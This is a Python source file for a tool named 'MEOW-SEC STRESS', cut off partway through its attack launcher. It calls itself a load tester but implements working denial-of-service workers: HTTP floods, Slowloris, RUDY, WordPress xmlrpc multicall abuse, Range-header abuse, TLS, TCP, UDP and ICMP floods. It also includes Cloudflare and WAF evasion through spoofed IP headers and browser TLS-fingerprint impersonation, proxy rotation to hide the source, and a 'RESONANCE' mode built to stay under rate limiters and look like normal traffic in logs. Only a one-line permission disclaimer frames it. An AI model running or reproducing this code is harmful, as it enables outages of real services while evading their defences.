# -*- coding: utf-8 -*-
"""
MEOW-SEC :: STRESS — Load & Stress Testing
  · L7 HTTP  (GET, POST, HEAD, BYPASS, SLOWLORIS, RUDY, JSON, COOKIE, XMLRPC, RANGE, TLS, MIXED)
  · L4 TCP   (connection flood, SOCKS proxy support)
  · L4 UDP   (packet flood)
  · ICMP     (subprocess ping flood)
  · Proxy rotation intégrée sur TOUTES les méthodes
  Use ONLY on systems you own or have explicit written permission to test.
"""
import os, sys, time, socket, threading, random, string, ssl
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN, CAT_HACKER
from rich.panel   import Panel
from rich.table   import Table
from rich.text    import Text
from rich.align   import Align
from rich.prompt  import Prompt, IntPrompt, Confirm
from rich.live    import Live
from rich.layout  import Layout
from rich         import box
from rich.rule    import Rule

try:
    import requests as _req
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import socks as _socks
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

# curl_cffi — browser TLS fingerprint impersonation (bypass Cloudflare JA3 detection)
try:
    from curl_cffi import requests as _cffi_req
    HAS_CFFI = True
except ImportError:
    HAS_CFFI = False

# Navigateurs supportés par curl_cffi pour l'impersonation
_CFFI_BROWSERS = ["chrome110", "chrome107", "chrome104", "chrome101",
                  "chrome100", "chrome99", "firefox102", "firefox100",
                  "edge101", "safari15_3", "safari15_5"]

# ─── STAT BLOCK ──────────────────────────────────────────────

class Stats:
    def __init__(self):
        self._lock      = threading.Lock()
        self.sent       = 0
        self.ok         = 0
        self.fail       = 0
        self.bytes_sent = 0
        self.latencies  = []
        self.start      = time.time()

    def hit(self, success: bool, latency_ms: float = 0, nbytes: int = 0):
        with self._lock:
            self.sent += 1
            if success: self.ok += 1
            else:        self.fail += 1
            if latency_ms > 0: self.latencies.append(latency_ms)
            self.bytes_sent += nbytes

    @property
    def elapsed(self) -> float:
        return max(time.time() - self.start, 0.001)

    @property
    def rps(self) -> float:
        return self.sent / self.elapsed

    @property
    def avg_ms(self) -> float:
        if not self.latencies: return 0.0
        return sum(self.latencies) / len(self.latencies)

    def render_table(self, target: str, method: str, running: bool) -> Table:
        t = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style=G2,
                  header_style=CY, show_lines=False, expand=True)
        t.add_column("Metric",  style=CY, width=18)
        t.add_column("Value",   style=G1)

        status = f"[bold {G1}]● RUNNING[/]" if running else f"[bold {OR}]■ STOPPED[/]"
        t.add_row("Target",     target)
        t.add_row("Method",     f"[bold {OR}]{method}[/]")
        t.add_row("Status",     status)
        t.add_row("Elapsed",    f"{self.elapsed:.1f}s")
        t.add_row("Requests",   f"[bold {G1}]{self.sent:,}[/]")
        t.add_row("Success",    f"[{G1}]{self.ok:,}[/]")
        t.add_row("Failed",     f"[{RD}]{self.fail:,}[/]")
        t.add_row("RPS",        f"[bold {G1}]{self.rps:,.1f}[/]")
        t.add_row("Avg latency",f"{self.avg_ms:.1f} ms")
        t.add_row("Data sent",  _fmt_bytes(self.bytes_sent))
        return t

def _fmt_bytes(n: int) -> str:
    if n < 1024:      return f"{n} B"
    if n < 1048576:   return f"{n/1024:.1f} KB"
    return                  f"{n/1048576:.2f} MB"

# ─── STOP FLAG ───────────────────────────────────────────────

_STOP = threading.Event()

# ─── SESSION FACTORY (curl_cffi si dispo → bypass JA3/Cloudflare) ──────────

def _make_session(use_cffi: bool = False):
    """
    Retourne une session HTTP.
    Si curl_cffi est dispo et use_cffi=True : impersonation Chrome → bypass Cloudflare JA3.
    Sinon : requests standard.
    """
    if use_cffi and HAS_CFFI:
        browser = random.choice(_CFFI_BROWSERS)
        return _cffi_req.Session(impersonate=browser)
    return _req.Session()

# ─── PROXY HEALTHCHECK ───────────────────────────────────────

def _proxy_healthcheck(target_url: str, sample: int = 40, timeout: int = 4) -> int:
    """
    Vérifie rapidement les proxies du pool avant une attaque.
    Teste `sample` proxies en parallèle contre target_url.
    Marque les morts comme bad. Retourne le nombre de proxies vivants.
    """
    try:
        from core.proxy_manager import get_manager
        mgr = get_manager()
    except Exception:
        return 0

    pool = mgr.good
    if not pool:
        warn("Proxy pool vide — lance PROXYCAT pour télécharger des proxies.")
        return 0

    # Prendre un échantillon representatif (top rapides + quelques du milieu)
    top_n = min(sample, len(pool))
    candidates = pool[:top_n]

    alive_count = 0
    dead_count  = 0
    lock = threading.Lock()

    console.print()
    info(f"Proxy checkup — testing [{G1}]{top_n}[/] proxies ({timeout}s timeout)...")

    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn
    with Progress(
        SpinnerColumn(style=G1),
        TextColumn(f"[{G1}]Checking proxies"),
        BarColumn(bar_width=35, style=G2, complete_style=G1),
        MofNCompleteColumn(),
        console=console, transient=True
    ) as prog:
        task = prog.add_task("", total=top_n)

        def _test(entry):
            nonlocal alive_count, dead_count
            proxy_str = entry["proxy"]
            if proxy_str.startswith("socks5://") or proxy_str.startswith("socks4://"):
                pdict = {"http": proxy_str, "https": proxy_str}
            else:
                pdict = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
            try:
                r = _req.get(target_url, proxies=pdict, timeout=timeout,
                             verify=False, allow_redirects=False,
                             headers={"User-Agent": "MEOW-CHECK/1.1"})
                ok_flag = r.status_code < 600
            except Exception:
                ok_flag = False
            with lock:
                if ok_flag:
                    alive_count += 1
                else:
                    dead_count += 1
                    mgr.mark_bad(proxy_str)
            prog.advance(task)

        with concurrent.futures.ThreadPoolExecutor(max_workers=min(top_n, 60)) as pool_exec:
            list(pool_exec.map(_test, candidates))

    total_alive = len([p for p in mgr.good if p["proxy"] not in mgr.bad])
    if total_alive >= 5:
        ok(f"Proxy pool: [{G1}]{total_alive}[/] vivants / {dead_count} morts dans l'échantillon")
    elif total_alive > 0:
        warn(f"Seulement [{OR}]{total_alive}[/] proxies vivants — relance PROXYCAT pour refresh")
    else:
        err("Aucun proxy vivant — attaque sans proxy ou relance PROXYCAT")
    console.print()
    return total_alive


# ─── PROXY HELPERS ───────────────────────────────────────────

def _get_proxy() -> dict | None:
    """Retourne un proxy dict HTTP/SOCKS pour requests"""
    try:
        from core.proxy_manager import get_manager
        return get_manager().get_dict()
    except Exception:
        return None

def _get_socks_proxy() -> tuple | None:
    """
    Retourne (scheme, host, port) pour un proxy SOCKS ou HTTP.
    Utilisé pour les connexions raw socket (TCP, SLOWLORIS, RUDY).
    """
    try:
        from core.proxy_manager import get_manager
        proxy_str = get_manager().get()
        if not proxy_str:
            return None
        if proxy_str.startswith("socks5://"):
            h, p = proxy_str.replace("socks5://","").split(":")
            return ("socks5", h, int(p))
        if proxy_str.startswith("socks4://"):
            h, p = proxy_str.replace("socks4://","").split(":")
            return ("socks4", h, int(p))
        # plain HTTP proxy — split host:port
        addr = proxy_str.replace("http://","")
        h, p = addr.split(":")
        return ("http", h, int(p))
    except Exception:
        return None

def _socks_connect(host: str, port: int) -> socket.socket | None:
    """Ouvre une connexion TCP via proxy SOCKS si disponible, sinon directe"""
    proxy = _get_socks_proxy()
    if proxy and HAS_SOCKS:
        scheme, ph, pp = proxy
        try:
            s = _socks.socksocket()
            if scheme == "socks5":
                s.set_proxy(_socks.SOCKS5, ph, pp)
            elif scheme == "socks4":
                s.set_proxy(_socks.SOCKS4, ph, pp)
            else:
                s.set_proxy(_socks.HTTP, ph, pp)
            s.settimeout(6)
            s.connect((host, port))
            return s
        except Exception:
            pass
    # fallback direct
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(6)
    try:
        s.connect((host, port))
        return s
    except Exception:
        return None

# ─── L7 HTTP GET ─────────────────────────────────────────────

def _worker_http_get(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    session = _req.Session()
    while not _STOP.is_set():
        headers = {"User-Agent": random.choice(ua_list),
                   "Accept": "*/*", "Cache-Control": "no-cache"}
        t0 = time.perf_counter()
        try:
            r = session.get(url, headers=headers,
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(200 <= r.status_code < 500, lat, len(r.content))
        except Exception:
            stats.hit(False)

# ─── L7 HTTP POST ────────────────────────────────────────────

def _worker_http_post(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    session = _req.Session()
    while not _STOP.is_set():
        headers = {"User-Agent": random.choice(ua_list),
                   "Content-Type": "application/x-www-form-urlencoded"}
        body = _rand_str(random.randint(64, 512)).encode()
        t0 = time.perf_counter()
        try:
            r = session.post(url, data=body, headers=headers,
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(200 <= r.status_code < 500, lat, len(body))
        except Exception:
            stats.hit(False)

# ─── L7 HTTP HEAD ────────────────────────────────────────────

def _worker_http_head(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    session = _req.Session()
    while not _STOP.is_set():
        headers = {"User-Agent": random.choice(ua_list)}
        t0 = time.perf_counter()
        try:
            r = session.head(url + f"?{_rand_str(6)}={_rand_str(8)}",
                             headers=headers,
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat)
        except Exception:
            stats.hit(False)

# ─── L7 BYPASS (CF/WAF evasion) ──────────────────────────────

def _bypass_headers(ua_list: list) -> dict:
    fake_ip  = ".".join(str(random.randint(1,254)) for _ in range(4))
    referrers = [
        "https://www.google.com/", "https://www.bing.com/",
        "https://t.co/", "https://www.reddit.com/", "https://duckduckgo.com/",
    ]
    return {
        "User-Agent":       random.choice(ua_list),
        "X-Forwarded-For":  fake_ip,
        "X-Real-IP":        fake_ip,
        "CF-Connecting-IP": fake_ip,
        "True-Client-IP":   fake_ip,
        "X-Originating-IP": fake_ip,
        "Referer":          random.choice(referrers),
        "Cache-Control":    "no-cache, no-store",
        "Pragma":           "no-cache",
        "Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language":  "en-US,en;q=0.5",
        "Accept-Encoding":  "gzip, deflate",
        "Connection":       "keep-alive",
        "DNT":              "1",
    }

def _worker_http_bypass(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    session = _req.Session()
    while not _STOP.is_set():
        cache_buster = f"?_={int(time.time()*1000)}&cb={_rand_str(8)}"
        headers = _bypass_headers(ua_list)
        t0 = time.perf_counter()
        try:
            r = session.get(url + cache_buster, headers=headers,
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat, len(r.content))
        except Exception:
            stats.hit(False)

# ─── L7 SLOWLORIS ────────────────────────────────────────────

def _worker_slowloris(host: str, port: int, stats: Stats, use_proxy: bool):
    """Connexions partielles — proxy SOCKS si disponible"""
    sockets = []
    while not _STOP.is_set():
        try:
            s = _socks_connect(host, port) if use_proxy else None
            if s is None:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
            s.send(f"GET /?{_rand_str(8)} HTTP/1.1\r\nHost: {host}\r\n".encode())
            sockets.append(s)
            stats.hit(True, nbytes=64)
        except Exception:
            stats.hit(False)

        dead = []
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            except Exception:
                dead.append(s)
        for s in dead:
            try: s.close()
            except: pass
            sockets.remove(s)
        time.sleep(random.uniform(0.5, 1.5))

    for s in sockets:
        try: s.close()
        except: pass

# ─── L7 RUDY ─────────────────────────────────────────────────

def _worker_rudy(host: str, port: int, path: str, stats: Stats, use_proxy: bool):
    """Slow POST body — proxy SOCKS si disponible"""
    while not _STOP.is_set():
        try:
            s = _socks_connect(host, port) if use_proxy else None
            if s is None:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((host, port))
            body_len = random.randint(100000, 999999)
            ua = random.choice(UA_LIST)
            req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {body_len}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            s.send(req.encode())
            stats.hit(True, nbytes=len(req))
            sent = 0
            while sent < body_len and not _STOP.is_set():
                s.send(_rand_str(1).encode())
                sent += 1
                stats.hit(True, nbytes=1)
                time.sleep(random.uniform(0.05, 0.2))
            s.close()
        except Exception:
            stats.hit(False)
            time.sleep(0.5)

# ─── L7 JSON FLOOD ───────────────────────────────────────────

def _worker_http_json(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    """POST avec body JSON aléatoire — APIs / REST endpoints"""
    session = _req.Session()
    while not _STOP.is_set():
        import json as _json
        payload = _json.dumps({
            _rand_str(6): _rand_str(random.randint(8,64)),
            "id":  random.randint(1, 999999),
            "ts":  int(time.time()),
            "token": _rand_str(32),
        })
        headers = {
            "User-Agent":   random.choice(ua_list),
            "Content-Type": "application/json",
            "Accept":       "application/json",
            "X-Requested-With": "XMLHttpRequest",
        }
        t0 = time.perf_counter()
        try:
            r = session.post(url, data=payload.encode(), headers=headers,
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat, len(payload))
        except Exception:
            stats.hit(False)

# ─── L7 COOKIE FLOOD ─────────────────────────────────────────

def _worker_http_cookie(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    """Envoie des headers Cookie massifs — épuise les parsers / session stores"""
    session = _req.Session()
    while not _STOP.is_set():
        # Génère 50-100 cookies aléatoires
        cookies = "; ".join(f"{_rand_str(8)}={_rand_str(16)}"
                            for _ in range(random.randint(50, 100)))
        headers = {
            "User-Agent": random.choice(ua_list),
            "Cookie":     cookies,
            "Accept":     "*/*",
        }
        t0 = time.perf_counter()
        try:
            r = session.get(url, headers=headers,
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat, len(cookies))
        except Exception:
            stats.hit(False)

# ─── L7 XMLRPC (WordPress) ───────────────────────────────────

def _worker_xmlrpc(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    """
    Flood xmlrpc.php — chaque requête déclenche des centaines d'auth
    si multicall est activé (WordPress pre-6.x).
    """
    parsed = urlparse(url)
    xmlrpc_url = f"{parsed.scheme}://{parsed.netloc}/xmlrpc.php"
    payload = """<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params><param><value><array><data>
""" + "".join(f"""<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>{_rand_str(8)}</string></value>
</data></array></value></member>
</struct></value>
""" for _ in range(100)) + """</data></array></value></param></params>
</methodCall>"""

    session = _req.Session()
    while not _STOP.is_set():
        headers = {
            "User-Agent":   random.choice(ua_list),
            "Content-Type": "text/xml",
            "Content-Length": str(len(payload)),
        }
        t0 = time.perf_counter()
        try:
            r = session.post(xmlrpc_url, data=payload.encode(), headers=headers,
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=12, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat, len(payload))
        except Exception:
            stats.hit(False)

# ─── L7 RANGE FLOOD ──────────────────────────────────────────

def _worker_http_range(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    """
    HTTP Range header abuse — force le serveur à parser des ranges complexes.
    Efficace contre certains serveurs non-patchés (CVE-2011-3192 style).
    """
    session = _req.Session()
    while not _STOP.is_set():
        # Génère 50-150 ranges aléatoires
        ranges = ",".join(
            f"{random.randint(0,9999999)}-{random.randint(0,9999999)}"
            for _ in range(random.randint(50, 150))
        )
        headers = {
            "User-Agent":    random.choice(ua_list),
            "Range":         f"bytes={ranges}",
            "Request-Range": f"bytes={ranges}",
            "Accept":        "*/*",
        }
        t0 = time.perf_counter()
        try:
            r = session.get(url, headers=headers,
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat)
        except Exception:
            stats.hit(False)

# ─── L7 TLS HANDSHAKE FLOOD ──────────────────────────────────

def _worker_tls(host: str, port: int, stats: Stats, use_proxy: bool):
    """
    TLS handshake flood — chaque connexion SSL coûte ~10× plus de CPU côté serveur.
    Proxy SOCKS si disponible pour masquer la source.
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    while not _STOP.is_set():
        t0 = time.perf_counter()
        try:
            raw = _socks_connect(host, port) if use_proxy else None
            if raw is None:
                raw = socket.create_connection((host, port), timeout=5)
            conn = ctx.wrap_socket(raw, server_hostname=host)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(True, lat)
            conn.close()
        except Exception:
            stats.hit(False)

# ─── L7 MIXED (rotation aléatoire) ───────────────────────────

def _worker_http_mixed(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    """Alterne GET/POST/HEAD/BYPASS aléatoirement — harder to fingerprint / rate-limit"""
    session = _req.Session()
    methods_list = [
        lambda: session.get(url + f"?{_rand_str(6)}",
                            headers={"User-Agent": random.choice(ua_list)},
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False),
        lambda: session.post(url,
                             data=_rand_str(random.randint(32,256)).encode(),
                             headers={"User-Agent": random.choice(ua_list),
                                      "Content-Type": "application/x-www-form-urlencoded"},
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=10, allow_redirects=False, verify=False),
        lambda: session.head(url + f"?{_rand_str(4)}={_rand_str(6)}",
                             headers={"User-Agent": random.choice(ua_list)},
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=10, allow_redirects=False, verify=False),
        lambda: session.get(url + f"?_={int(time.time()*1000)}",
                            headers=_bypass_headers(ua_list),
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False),
    ]
    while not _STOP.is_set():
        t0 = time.perf_counter()
        try:
            r = random.choice(methods_list)()
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat, len(getattr(r, 'content', b'')))
        except Exception:
            stats.hit(False)

# ─── RESONANCE — ADAPTIVE WORKER SATURATION ──────────────────
#
#  Basé sur la loi de Little : L = λW
#    L = workers occupés, λ = req/s envoyées, W = temps de réponse
#
#  Principe : au lieu d'envoyer MAX requêtes (flood naïf), on envoie
#  EXACTEMENT assez pour que 100% des workers du serveur soient
#  perpétuellement occupés, sans jamais créer de file d'attente.
#
#  Avantage :
#  - Rate-limiters ne se déclenchent pas (taux de req/s FAIBLE)
#  - Logs ressemblent à du trafic normal
#  - Utilisation serveur : 100% — même effet qu'une attaque 10× plus grande
#  - CPU attaquant : quasi nul (on dort entre chaque requête)
#
#  Adaptation en temps réel : si le serveur ralentit (charge), on réduit
#  notre intervalle proportionnellement → on reste TOUJOURS au point de
#  résonance, jamais au-dessus (pas de file), jamais en-dessous (max charge)
#
class _ResonanceTimer:
    """
    Gestionnaire d'intervalle adaptatif partagé entre tous les workers.
    Implémente Little's Law pour maintenir λ = L/W en permanence.
    """
    def __init__(self, initial_latency_s: float, worker_count: int):
        self._lock       = threading.Lock()
        self._samples    = []
        self._workers    = worker_count
        # Intervalle initial : chaque worker attend W secondes entre requêtes
        # → λ total = workers / W = exactement ce qu'il faut pour L=workers
        self._interval   = max(0.02, initial_latency_s)
        self._last_adapt = time.time()
        self._gen         = 0          # génération courante (pour les logs)

    def report(self, latency_s: float, success: bool):
        """Worker appelle ça après chaque requête."""
        with self._lock:
            if success and 0.001 < latency_s < 30:
                self._samples.append(latency_s)

            # Ré-adaptation toutes les 3 secondes ou 30 samples
            now = time.time()
            if (now - self._last_adapt >= 3.0) and len(self._samples) >= 10:
                import statistics
                # P75 — pas la médiane : on veut charger, pas être conservateur
                p75 = statistics.quantiles(self._samples[-40:], n=4)[2]

                # Loi de Little inversée :
                # interval_par_worker = p75 * (1 - epsilon)
                # epsilon = 0.03 → on est à 97% de la capacité, jamais 100%
                # (évite de déclencher les timeouts du serveur)
                new_interval = max(0.015, p75 * 0.97)

                # Lissage exponentiel : 70% ancien, 30% nouveau
                self._interval = self._interval * 0.70 + new_interval * 0.30
                self._samples  = self._samples[-40:]
                self._last_adapt = now
                self._gen += 1

    @property
    def interval(self) -> float:
        return self._interval

    @property
    def generation(self) -> int:
        return self._gen


def _calibrate_resonance(url: str, use_proxy: bool, n: int = 6) -> float:
    """
    Phase de calibration : mesure le temps de réponse baseline.
    Lance N requêtes rapides, retourne le P75.
    """
    import statistics as _st
    latencies = []
    session = _req.Session()
    info(f"Calibrating frequency ({n} probes, 8s timeout each)...")

    for i in range(n):
        t0 = time.perf_counter()
        try:
            r = session.get(url, timeout=8, verify=False,
                            proxies=_get_proxy() if use_proxy else None,
                            headers={"User-Agent": random.choice(UA_LIST),
                                     "Cache-Control": "no-cache"},
                            allow_redirects=False)
            lat = time.perf_counter() - t0
            latencies.append(lat)
            info(f"  probe {i+1}/{n}  [{G1}]{lat*1000:.0f}ms[/]  HTTP {r.status_code}")
        except Exception:
            latencies.append(4.0)
            warn(f"  probe {i+1}/{n}  timeout/error — using 4s fallback")
        time.sleep(0.15)

    if not latencies:
        return 1.0

    p75 = _st.quantiles(latencies, n=4)[2]
    median = _st.median(latencies)
    find(f"Median={median*1000:.0f}ms  P75={p75*1000:.0f}ms  → interval=[{G1}]{p75*0.97*1000:.0f}ms[/]")
    return max(0.05, p75)


def _worker_resonance(url: str, stats: Stats, use_proxy: bool,
                      ua_list: list, timer: _ResonanceTimer):
    """
    Worker RESONANCE — s'endort exactement assez longtemps entre chaque
    requête pour maintenir le serveur à 100% de charge sans débordement.
    """
    session = _req.Session()

    while not _STOP.is_set():
        interval = timer.interval

        t0 = time.perf_counter()
        try:
            headers = {
                "User-Agent":      random.choice(ua_list),
                "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control":   "no-cache",
                "Pragma":          "no-cache",
                "Connection":      "keep-alive",
                "X-Request-ID":    _rand_str(16),
            }
            r = session.get(url, headers=headers,
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=8, allow_redirects=False, verify=False)
            elapsed = time.perf_counter() - t0
            success = 200 <= r.status_code < 500
            stats.hit(success, elapsed * 1000, len(r.content))
            timer.report(elapsed, success)
            sleep_t = max(0.0, interval - elapsed)
            if sleep_t > 0:
                time.sleep(sleep_t)

        except Exception:
            stats.hit(False)
            timer.report(1.5, False)
            # Pas de sleep supplémentaire — la requête a déjà pris son temps


def _resonance_stats_extra(timer: _ResonanceTimer) -> str:
    """Ligne de stats supplémentaire pour le panel live."""
    return (f"[{CY}]Resonance interval:[/] [{G1}]{timer.interval*1000:.1f}ms[/]  "
            f"[{CY}]Adaptations:[/] [{G1}]{timer.generation}[/]")


# ─── PULSAR — Synchronized Burst Wave ────────────────────

def _worker_pulsar(url: str, stats: Stats, use_proxy: bool,
                   ua_list: list, barrier: threading.Barrier,
                   sleep_ref: list, use_cffi: bool = False):
    """
    PULSAR — Vague de choc synchronisée.
    Tous les workers se synchronisent via Barrier puis tirent en même temps.
    Sature le pool accept() du serveur OS (128-512 slots) instantanément.
    stream=True : headers seulement, body abandonné immédiatement.
    Le serveur génère la réponse complète mais ne peut pas la livrer → waste.
    Si curl_cffi dispo : TLS fingerprint Chrome → bypass Cloudflare JA3.
    """
    while not _STOP.is_set():
        try:
            barrier.wait(timeout=4)
        except threading.BrokenBarrierError:
            return

        session = _make_session(use_cffi)
        r = None
        t0 = time.perf_counter()
        try:
            kwargs = dict(
                headers={
                    "User-Agent":      random.choice(ua_list),
                    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cache-Control":   "no-cache, no-store",
                    "Pragma":          "no-cache",
                    "Connection":      "close",
                    "X-Request-ID":    _rand_str(16),
                },
                proxies=_get_proxy() if use_proxy else None,
                timeout=6,
                allow_redirects=False,
                verify=False,
            )
            if not use_cffi:
                kwargs["stream"] = True
            r = session.get(url, **kwargs)
            elapsed = time.perf_counter() - t0
            r.close()
            stats.hit(r.status_code < 500, elapsed * 1000, 0)
        except Exception:
            stats.hit(False)
        finally:
            if r is not None:
                try: r.close()
                except Exception: pass

        time.sleep(max(0.02, sleep_ref[0]))


# ─── L4 TCP ──────────────────────────────────────────────────

def _worker_tcp(host: str, port: int, stats: Stats, use_proxy: bool):
    """TCP connection flood — SOCKS proxy si disponible"""
    while not _STOP.is_set():
        t0 = time.perf_counter()
        try:
            s = _socks_connect(host, port) if use_proxy else None
            if s is None:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(True, lat)
            s.close()
        except Exception:
            stats.hit(False)

# ─── L4 UDP ──────────────────────────────────────────────────

def _worker_udp(host: str, port: int, stats: Stats):
    """UDP packet flood — raw socket, pas de proxy possible sur UDP"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not _STOP.is_set():
        try:
            payload = os.urandom(random.randint(64, 1024))
            sock.sendto(payload, (host, port))
            stats.hit(True, nbytes=len(payload))
        except Exception:
            stats.hit(False)
    sock.close()

# ─── ICMP FLOOD ──────────────────────────────────────────────

def _worker_icmp(host: str, stats: Stats):
    """ICMP flood via subprocess"""
    import subprocess
    while not _STOP.is_set():
        try:
            cmd = ["ping", "-n", "1", "-w", "500", host] if os.name == "nt" \
                  else ["ping", "-c", "1", "-W", "1", host]
            r = subprocess.run(cmd, capture_output=True, timeout=3)
            stats.hit(r.returncode == 0)
        except Exception:
            stats.hit(False)

# ─── UTILS ───────────────────────────────────────────────────

def _rand_str(n: int) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "curl/8.5.0",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]

def _parse_target(target: str) -> tuple:
    if "://" not in target:
        target = "http://" + target
    p = urlparse(target)
    host = p.hostname or target
    port = p.port or (443 if p.scheme == "https" else 80)
    return host, port, target

# ─── LIVE DISPLAY ────────────────────────────────────────────

def _run_attack(target: str, method: str, workers: int, duration: int,
                use_proxy: bool, use_cffi: bool = False):
    stats = Stats()
    _STOP.clear()

    host, port, url = _parse_target(target)
    parsed_path = urlparse(url).path or "/"

    HTTP_METHODS = {"HTTP_GET","HTTP_POST","HTTP_HEAD","HTTP_BYPASS",
                    "HTTP_JSON","HTTP_COOKIE","HTTP_XMLRPC","HTTP_RANGE","HTTP_MIXED",
                    "RESONANCE","PULSAR"}
    SOCKET_METHODS = {"SLOWLORIS","RUDY","TLS","TCP"}

    if method in HTTP_METHODS and not HAS_REQUESTS and not HAS_CFFI:
        err("requests or curl_cffi required for HTTP methods."); return

    if use_cffi and not HAS_CFFI:
        warn("curl_cffi not installed — falling back to requests (no CF bypass).")
        warn("  Install: pip install curl_cffi")
        use_cffi = False

    if use_cffi:
        ok(f"[bold {G1}]curl_cffi mode[/] — TLS fingerprint = Chrome (Cloudflare bypass actif)")

    # ── PROXY HEALTHCHECK avant l'attaque ──────────────────────
    if use_proxy:
        alive = _proxy_healthcheck(url, sample=50, timeout=4)
        if alive == 0:
            warn("Aucun proxy vivant — attaque lancée SANS proxy.")
            use_proxy = False
        elif alive < workers // 2:
            warn(f"Seulement {alive} proxies vivants pour {workers} workers — "
                 f"certains workers partageront les mêmes proxies.")

    # RESONANCE : calibration avant lancement
    resonance_timer = None
    if method == "RESONANCE":
        base_lat = _calibrate_resonance(url, use_proxy)
        resonance_timer = _ResonanceTimer(base_lat, workers)
        ok(f"Resonance calibrated — interval [{G1}]{resonance_timer.interval*1000:.0f}ms[/]  workers [{G1}]{workers}[/]")
        ok(f"Theoretical max load: [{G1}]{workers / resonance_timer.interval:.1f}[/] req/s sustained")
        console.print()

    # PULSAR : calibration + barrier + sleep_ref partagé
    pulsar_barrier  = None
    pulsar_sleep    = None
    if method == "PULSAR":
